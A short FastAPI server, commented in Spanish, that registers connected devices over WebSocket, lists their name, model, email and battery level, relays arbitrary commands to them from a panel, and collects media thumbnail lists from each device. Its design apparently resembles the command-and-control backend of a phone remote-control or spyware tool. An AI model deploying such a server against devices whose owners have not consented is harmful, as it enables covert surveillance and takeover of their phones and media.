from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from pydantic import BaseModel
import json

app = FastAPI()

# --- Diccionarios en memoria para guardar el estado ---
connected_agents: dict[str, dict] = {}
device_media_cache: dict[str, list] = {}

# --- Rutas de la API ---

@app.get("/api/get-agents")
async def get_agents():
    """Devuelve la lista de agentes conectados."""
    # Adaptado para devolver la estructura que el panel espera
    agent_list = []
    for agent_id, agent_data in connected_agents.items():
        details = agent_data.get("details", {})
        agent_list.append({
            "id": agent_id,
            "name": details.get("name", "N/A"),
            "model": details.get("model", "N/A"),
            "email": details.get("email", "N/A"),
            "batteryLevel": details.get("batteryLevel", -1)
        })
    return agent_list

@app.post("/api/send-command")
async def send_command(command: dict):
    """Recibe un comando del panel y lo reenvía al agente correcto."""
    target_id = command.get("target_id")
    if not target_id or target_id not in connected_agents:
        return {"status": "error", "message": "Agente no conectado"}
    try:
        await connected_agents[target_id]["ws"].send_text(json.dumps(command))
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e:
        return {"status": "error", "message": f"Fallo al enviar: {e}"}

# Ruta para recibir las miniaturas
@app.post("/api/submit_media_list/{device_id}")
async def submit_media_list(media_list: list, device_id: str):
    print(f"Recibida lista de medios ({len(media_list)} archivos) del dispositivo {device_id}")
    device_media_cache[device_id] = media_list
    return {"status": "success"}

# Ruta para entregar las miniaturas
@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    return device_media_cache.get(device_id, [])

# --- ¡LA RUTA DEL WEBSOCKET CORRECTA! ---
# Espera que el agente envíe toda su información en la URL
@app.websocket("/ws/{device_id}/{device_name}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: {device_name} (ID: {device_id})")
    # Guardamos los detalles directamente desde la URL
    connected_agents[device_id] = {"ws": websocket, "details": {"id": device_id, "name": device_name}}
    try:
        while True:
            await websocket.receive_text() # Mantiene la conexión viva
    except WebSocketDisconnect:
        print(f"[DESCONEXIÓN] Agente desconectado: {device_name}")
        if device_id in connected_agents:
            del connected_agents[device_id]
